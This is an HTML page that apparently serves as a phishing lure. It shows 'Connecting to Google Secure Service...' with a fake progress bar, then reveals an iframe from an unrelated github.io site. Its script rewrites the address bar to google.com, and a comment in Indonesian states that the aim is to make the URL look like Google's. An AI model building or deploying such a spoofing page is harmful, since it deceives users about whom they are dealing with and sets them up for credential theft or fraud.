<!doctype html>
<html>
<head>
<meta charset="utf-8">

<style>
body{
  font-family:Arial;
  text-align:center;
  margin-top:120px;
}

#loader{
  margin-top:40px;
}

#progress{
  width:320px;
  height:20px;
  border:1px solid #ccc;
  margin:auto;
}

#bar{
  width:0%;
  height:100%;
  background:#4CAF50;
}

#content{
  display:none;
  margin-top:40px;
}

iframe{
  width:100%;
  height:600px;
  border:none;
}
</style>

</head>

<body>

<h2>Connecting to Google Secure Service...</h2>

<div id="loader">

<div id="progress">
<div id="bar"></div>
</div>

</div>

<div id="content">
<iframe src="https://ecdnts-del.github.io"></iframe>
</div>

<script>

// membuat URL terlihat google
history.replaceState({}, "", "https://www.google.com/");

let bar=document.getElementById("bar");
let width=0;

let interval=setInterval(function(){

if(width>=100){

clearInterval(interval);

document.getElementById("loader").style.display="none";
document.getElementById("content").style.display="block";

}else{

width+=5;
bar.style.width=width+"%";

}

},120);

</script>

</body>
</html>
